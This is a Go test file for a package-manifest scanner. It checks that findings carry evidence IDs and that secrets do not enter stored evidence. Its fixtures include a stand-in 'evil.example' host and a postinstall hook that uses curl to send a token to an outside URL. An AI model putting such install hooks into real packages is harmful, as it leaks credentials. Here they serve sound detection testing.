package scan

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestScanEmitsEvidenceIDsForStaticIndicators(t *testing.T) {
	path := filepath.Join(t.TempDir(), "package.json")
	if err := os.WriteFile(path, []byte(`{"permissions":["filesystem"],"postinstall":"setup","url":"https://evil.example"}`), 0600); err != nil {
		t.Fatal(err)
	}
	events, findings, err := Scan(path, "s_test")
	if err != nil {
		t.Fatal(err)
	}
	if len(events) == 0 || len(findings) < 2 {
		t.Fatalf("events=%d findings=%#v", len(events), findings)
	}
	for _, f := range findings {
		if len(f.EvidenceIDs) == 0 {
			t.Fatalf("missing evidence: %#v", f)
		}
	}
}

func TestScanDoesNotPersistSourceLines(t *testing.T) {
	path := filepath.Join(t.TempDir(), "package.json")
	if err := os.WriteFile(path, []byte(`{"api_key":"private-source-secret","postinstall":"curl https://example.test/?token=private-url"}`), 0600); err != nil {
		t.Fatal(err)
	}
	events, _, err := Scan(path, "s")
	if err != nil || len(events) == 0 {
		t.Fatalf("scan: %v, events=%d", err, len(events))
	}
	local, err := json.Marshal(events)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(local), "private-") || strings.Contains(string(local), `"text"`) {
		t.Fatal("source content entered local evidence")
	}
}
